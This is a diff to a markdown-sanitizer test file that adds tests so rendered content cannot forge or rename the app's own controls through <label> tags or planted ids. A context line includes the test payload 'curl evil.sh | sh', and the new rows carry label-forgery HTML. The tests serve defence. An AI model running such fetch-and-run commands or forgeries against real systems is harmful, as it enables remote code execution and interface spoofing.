@@ -34,6 +34,7 @@ import {
   renderMarkdown,
   SANITIZE_CONFIG,
   STREAMING_CARET,
+  TASK_GLYPH,
 } from './markdown';
 
 describe('renderMarkdown — the one pipeline', () => {
@@ -555,6 +556,46 @@ describe('the style attribute: one profile, and every surface uses it (#436)', (
       '<p>run the build</p><dialog><pre>curl evil.sh | sh</pre></dialog>',
       'run the build',
       'dialog',
+    ],
+
+    // #654 — the tag that NAMES a control instead of drawing one. Same table
+    // again, and the update-dialog column is again the one that matters: it
+    // renders GitHub's release notes with no pass of its own, so a `<label>`
+    // pass written into `feed-markdown.ts` would have left it open.
+    //
+    // The third column of the three `for=` rows is prose OUTSIDE the label,
+    // because `KEEP_CONTENT` keeps a label's children — the words survive, the
+    // element does not, so the guard is text the payload could not have eaten
+    // either way. The upper-case row keeps that shape too rather than guarding
+    // on the label's own text, which would still pass but would not be the same
+    // statement as the rows around it.
+    [
+      'a label that operates one of the app’s own controls',
+      'See the docs:\n\n<label for="push-field-ntfy.topic">Read the setup guide</label>',
+      'See the docs:',
+      'label',
+    ],
+    [
+      'a label that renames one of the app’s own controls to a screen reader',
+      'Notes:\n\n<label for="app-delete-session">Save preferences</label>',
+      'Notes:',
+      'label',
+    ],
+    [
+      // A label needs no `for` to be a label — wrapping associates implicitly.
+      // Nothing labelable survives #612 for it to wrap TODAY, which is exactly
+      // the kind of “unreachable in practice” this family keeps having to
+      // strike out, so the TAG goes rather than the attribute.
+      'a label with no `for` at all, wrapping its target',
+      'Sign in:\n\n<label>Token <input type="text" name="t"></label>',
+      'Sign in:',
+      'label',
+    ],
+    [
+      'an upper-case label',
+      'Shouty:\n\n<LABEL FOR="x">SHOUTING</LABEL>',
+      'Shouty:',
+      'label',
     ],
   ];
 
@@ -1690,6 +1731,240 @@ describe('content cannot plant a media player, a hot spot or a hidden box (#625)
     stripMedia(raw, LABELS);
     expect(raw.querySelector('video')).toBeNull();
     expect(raw.querySelector('.doc-media-chip')?.textContent).toBe(LABELS.mediaOmitted);
+  });
+});
+
+describe('content cannot NAME one of the app’s own controls (#654)', () => {
+  // The decision, pinned. #612 closed content DRAWING a control; this closes
+  // content NAMING one of OURS — the same forgery reached through an IDREF
+  // instead of an element, and the one mechanism on the page that crosses the
+  // boundary between rendered content and the app’s own chrome.
+  //
+  // WHAT THE MEASUREMENT SAID (`markdown.tsx`’s eighth block carries it in
+  // full). Two corpora, both 2026-08-21: 7,737 transcripts / 18,926 assistant
+  // text blocks / 10.4 MB, and 1,188 real `.md` files / 15.6 MB on this
+  // machine’s project roots. `<label` 5 + 2, `for="…"` 3 + 1, `<output` 0 + 1.
+  // Every one inside a code span. BARE IN PROSE: zero, in both.
+  //
+  // WHAT jsdom CANNOT SEE, said here so a green run is not read as more than it
+  // is. Everything about what a label DOES to its target — forwarding a click,
+  // toggling a checkbox, firing a button's handler, prepending its words to the
+  // accessible name — is layout and accessibility-tree behaviour, and jsdom has
+  // neither. Those were measured in Chromium 149 and written into
+  // `markdown.tsx`; what is executable HERE is that the element never reaches a
+  // surface in the first place.
+  //
+  // The surface×payload rows are up in the `style` block with #612's and
+  // #625's, riding the same `surfaces` table — and the update-dialog column is
+  // again the one that decides the design.
+
+  it('the profile forbids it BY NAME — because no flag can', () => {
+    // `label` is an ordinary member of DOMPurify's html-profile TAG allow-list,
+    // verified against the shipped 3.4.12 with this exact config, so there is
+    // no `ALLOW_*` that reaches it. Same shape as #612's and #625's pins.
+    expect(SANITIZE_CONFIG.FORBID_TAGS).toContain('label');
+    expect(renderMarkdown('<label for="x">y</label>')).not.toContain('<label');
+    // and the list is still inert at runtime, like every other entry on it
+    const forbidden = SANITIZE_CONFIG.FORBID_TAGS;
+    expect(() => forbidden?.pop()).toThrow();
+    expect(SANITIZE_CONFIG.FORBID_TAGS).toContain('label');
+  });
+
+  it('the element goes, its words stay — KEEP_CONTENT, as #612 has it', () => {
+    // `label` is NOT in DOMPurify's default `FORBID_CONTENTS` (unlike `audio`
+    // and `video`, which #625 had to write down as the exception), so this tag
+    // costs the reader nothing at all. Chromium's UA sheet gives `<label>` only
+    // `cursor: default` — same `display: inline`, same box as a `<span>`, and
+    // measured to the same rect — so the ONE visible difference is the mouse
+    // cursor over that run of text.
+    const html = renderMarkdown('<label for="x">Read the setup guide</label>');
+    expect(html).not.toContain('<label');
+    expect(html).toContain('Read the setup guide');
+    // child ELEMENTS survive too, not just text
+    const withChild = renderMarkdown(
+      '<label for="x"><a href="https://example.invalid">docs</a></label>'
+    );
+    expect(withChild).not.toContain('<label');
+    expect(withChild).toContain('href="https://example.invalid"');
+  });
+
+  it('`for` needs NO entry of its own — it survives on two tags and one is gone', () => {
+    // The line NOT written, pinned so nobody adds it back as protection that
+    // does nothing (`iframe`/`embed`/`object`'s situation, #625).
+    //
+    // DOMPurify 3.4.12 keeps `for` on exactly `<label>` and `<output>` and
+    // strips it everywhere else. One of those two is now forbidden; the other
+    // was measured in Chromium 149 to do NOTHING with it — no click forwarding,
+    // no entry in the target's `.labels`, no change to its accessible name. If
+    // a DOMPurify bump ever widens `for`, this reds.
+    expect(SANITIZE_CONFIG.FORBID_ATTR).not.toContain('for');
+    expect(renderMarkdown('<p for="x">prose</p>')).not.toContain('for=');
+    expect(renderMarkdown('<div for="x">block</div>')).not.toContain('for=');
+    expect(renderMarkdown('<span for="x">inline</span>')).not.toContain('for=');
+    // The three lines above are the real pin: if a DOMPurify bump ever widens
+    // `for` past `<label>`/`<output>`, one of them reds. The two below are a
+    // map rather than a detector — `.labels` is populated only by `<label>` per
+    // spec, so jsdom cannot fail them whatever a browser does. They are here
+    // because "`<output for>` names nothing" is the sentence `markdown.tsx`
+    // makes, and it should be somewhere executable even weakly.
+    const host = document.createElement('div');
+    document.body.appendChild(host);
+    host.innerHTML =
+      renderMarkdown('<output for="pin-654">o</output>') + '<input id="pin-654" type="text">';
+    const target = host.querySelector<HTMLInputElement>('#pin-654');
+    expect(target?.labels?.length).toBe(0);
+    host.remove();
+  });
+
+  it('loses nothing markdown can emit: GFM writes no <label>', () => {
+    // #612's lesson — `input` was on that list and `marked` really does emit
+    // one — so this claim gets checked rather than asserted. The whole GFM
+    // surface, rendered, with the tag name looked for in the output.
+    const gfm = [
+      '# Heading',
+      '',
+      '| a | b |',
+      '| - | - |',
+      '| 1 | 2 |',
+      '',
+      '- [ ] todo',
+      '- [x] done',
+      '',
+      '~~struck~~ and https://example.invalid/auto',
+      '',
+      '```js',
+      'const x = 1;',
+      '```',
+      '',
+      '> quote',
+      '',
+      '![pic](./local.png) and [link](https://example.invalid)',
+    ].join('\n');
+    const html = renderMarkdown(gfm);
+    expect(html).not.toContain('<label');
+    expect(html).not.toContain('for=');
+    // and the surface itself is unchanged — the no-regression half
+    expect(html).toContain('<table>');
+    expect(html).toContain(TASK_GLYPH.unchecked);
+    expect(html).toContain('src="./local.png"');
+  });
+
+  it('a code fence about <label> still renders it as CODE, not as markup', () => {
+    // Every one of the seven corpus hits was inside a code span, so this is the
+    // form the measurement says real prose actually uses. It must still read
+    // back as text.
+    const html = renderMarkdown('```html\n<label for="x">y</label>\n```');
+    const host = document.createElement('div');
+    host.innerHTML = html;
+    expect(host.querySelector('label')).toBeNull();
+    expect(host.textContent).toContain('<label for="x">y</label>');
+  });
+
+  it('no INLINE LITERAL id survives in the renderer, and the removed namespaces stay gone', () => {
+    // THE OTHER HALF, and it is not in `markdown.tsx` because a tag list cannot
+    // reach it: `id` survives the profile, so content can PLANT one of the
+    // app's names even with `<label>` gone. An IDREF resolves to the FIRST
+    // element in tree order carrying that id, so a forgery captures only if it
+    // is EARLIER — verified in Chromium 149 with the forgery placed first: the
+    // app's own `<label for>` bound to nothing (a `<span>` is not labelable, so
+    // the field lost its accessible name), and a combobox's
+    // `aria-activedescendant` resolved to the planted `<div>`, with no `role`
+    // on it because content cannot write one.
+    //
+    // WHAT THIS TEST IS AND IS NOT, named in the title because the first draft
+    // was called "the app writes no control id content could name" and did not
+    // do that. `React.useId()` is not a secret (React 19 numbers client ids
+    // from a global counter), and this scan sees INLINE LITERALS only: a future
+    // `const FIELD = 'sb-topic'` used as `id={FIELD}` would pass it. What it
+    // genuinely pins is (a) nobody types a literal id straight into JSX again,
+    // (b) no `htmlFor` takes a literal at all, and (c) the three namespaces
+    // #654 removed do not come back in any spelling. That is the reintroduction
+    // this item can actually guard, read off the source tree the way the
+    // one-pipeline test below does — and the RUNTIME proof (the label still
+    // binds) lives in each dialog's own test.
+    const root = path.join(process.cwd(), 'src', 'renderer', 'src');
+    const offenders: string[] = [];
+    // COMMENTS ARE STRIPPED, and not as a convenience: this file, the two
+    // dialogs and `CommandPalette` all QUOTE the removed ids in the note
+    // explaining why they went, and a scan that could not tell an explanation
+    // from a declaration would force the explanation out. Stripped as SPANS
+    // with block state carried across lines, not by dropping whole lines —
+    // dropping the line takes any code after a `*/` with it, and a wrapped
+    // `{/* … */}` block's continuation lines do not start with a marker at all.
+    const stripComments = (src: string): string => {
+      let out = '';
+      let inBlock = false;
+      for (let i = 0; i < src.length; i++) {
+        if (inBlock) {
+          if (src.startsWith('*/', i)) {
+            inBlock = false;
+            i++;
+          } else if (src[i] === '\n') {
+            // newlines kept, so a reported offender's line still lines up
+            out += '\n';
+          }
+          continue;
+        }
+        if (src.startsWith('/*', i)) {
+          inBlock = true;
+          i++;
+        } else if (src.startsWith('//', i)) {
+          while (i < src.length && src[i] !== '\n') i++;
+          out += '\n';
+        } else {
+          out += src[i] ?? '';
+        }
+      }
+      return out;
+    };
+    const walk = (dir: string): void => {
+      for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
+        const full = path.join(dir, entry.name);
+        if (entry.isDirectory()) {
+          walk(full);
+          continue;
+        }
+        if (!/\.tsx?$/.test(entry.name) || /\.test\.tsx?$/.test(entry.name)) continue;
+        const rel = path.relative(root, full).replace(/\\/g, '/');
+        const src = stripComments(fs.readFileSync(full, 'utf8'));
+        // (a) a LITERAL id, in either quote, plus the template-literal form
+        //     with no interpolation in it. `id={`${base}row`}` and `id={expr}`
+        //     are fine — what this refuses is a STABLE STRING typed in place.
+        //     The lookbehind keeps it off `data-id=` and off a QUERY:
+        //     `root.querySelector(`[id="${id}"]`)` in `DocumentViewer` READS an
+        //     id, it does not declare one (the `$`-free classes catch that too).
+        for (const m of src.matchAll(
+          /(?<![-\w[])\bid=(?:"([^"$]*)"|'([^'$]*)'|\{`([^`$]*)`\})/g
+        )) {
+          offenders.push(`${rel}: id="${m[1] ?? m[2] ?? m[3] ?? ''}"`);
+        }
+        // (b) a label whose target is a literal, in EITHER quote or a
+        //     non-interpolated template. Every `htmlFor` in the renderer
+        //     derives from `useId`; a literal one is the bug this item fixed.
+        for (const m of src.matchAll(
+          /\bhtmlFor=(?:"([^"$]*)"|'([^'$]*)'|\{`([^`$]*)`\})/g
+        )) {
+          offenders.push(`${rel}: htmlFor="${m[1] ?? m[2] ?? m[3] ?? ''}"`);
+        }
+        // (c) the namespaces this item removed, in ANY spelling — including one
+        //     rebuilt out of a template literal, which (a) cannot see. The
+        //     `data-` hooks are removed first: they are attribute NAMES, not
+        //     ids, and content cannot emit a `data-*` at all.
+        const withoutHooks = src.replace(/data-(?:push|quiet)-field|data-palette-rows?/g, '');
+        if (/(?:push|quiet)-field-|palette-rows?\b/.test(withoutHooks)) {
+          offenders.push(`${rel}: a removed literal id namespace is back`);
+        }
+      }
+    };
+    walk(root);
+    // The allow-list is the whole point of the assertion, in the one-pipeline
+    // test's shape: NOT `toEqual([])`, because a bare zero would have to be
+    // maintained by deleting the rule.
+    expect(offenders.sort()).toEqual([
+      // A React PROP called `id`, not a DOM attribute — `ContributionBoundary`
+      // uses it to name a contribution point in error messages.
+      'components/SessionGrid.tsx: id="document-viewer"',
+    ]);
   });
 });
 
